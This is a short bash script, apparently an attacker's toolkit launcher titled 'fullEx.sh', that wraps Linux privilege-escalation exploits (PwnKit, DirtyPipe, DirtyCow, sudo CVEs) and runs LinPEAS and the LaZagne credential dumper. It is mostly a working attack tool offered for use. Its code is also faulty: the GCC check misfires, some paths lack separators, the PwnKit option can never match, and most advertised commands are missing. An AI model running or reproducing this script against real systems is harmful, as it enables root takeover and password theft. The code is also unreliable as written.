#!/bin/bash

ascii() {
    cat <<"EOF"

                                                    
__________      ____________________       
___  ____/___  ____  /__  /__  ____/___  __
__  /_   _  / / /_  /__  /__  __/  __  |/_/
_  __/   / /_/ /_  / _  / _  /___  __>  <  
/_/      \__,_/ /_/  /_/  /_____/  /_/|_|  
                                                                                                   
by M0rPH3U53

      
EOF
}                                   

arch="64 32"

if [[ "$*" == "-help" ]]; then
    ascii
    echo "Usage: ./fullEx.sh COMMAND"
    echo " "
    echo "Commands:"
    echo "   -LinPeas       Execute LinPeas"
    echo "   -LaZagne       Execute LaZagne"
    echo "   -Overlays      Overlays64 - CVE-2015-1328"
    echo "   -DirtyCow      DirtyCow - CVE-2016-5195"
    echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
    echo "   -DirtyPipe     DirtyPipe - CVE-2022-0847"
    echo "   -Chroot        Sudo Chroot - CVE-2025-32463"
    echo "   -SudoHost      Sudo Hostname - CVE-2025-32462 "
    echo "   -check         Verifie si gcc est installer"
    echo "   -perm          Applique les droit d'execution"
    echo "   -compile       Compile le binaire"
    echo " "
    exit 0
fi

# Application des droit d'execution
if [[ "$*" == "-perm" ]]; then
   find ${PWD} -type f -exec chmod +x {} \;
fi

# Verifie si GCC est installer
if [[ "$*" == "-check" ]]; then
   which gcc python > /dev/null 2>&1
   echo "[+] GCC found !"
   
else
    echo "[-] GCC not found !"
fi

# LinPeas
if [[ "$*" == "-LinPeas" ]]; then
   "${PWD}linpeas/linpeas.sh"
fi

# LaZagne
if [[ "$*" == "-LaZagne" ]]; then
  "${PWD}/LaZagne/Linux/laZagne.py"
fi

# PwnKit
if [[ "$*" == "-PwnKit${arch}" ]]; then
   "${PWD}exploits/PwnKit/PwnKit${arch}"
fi
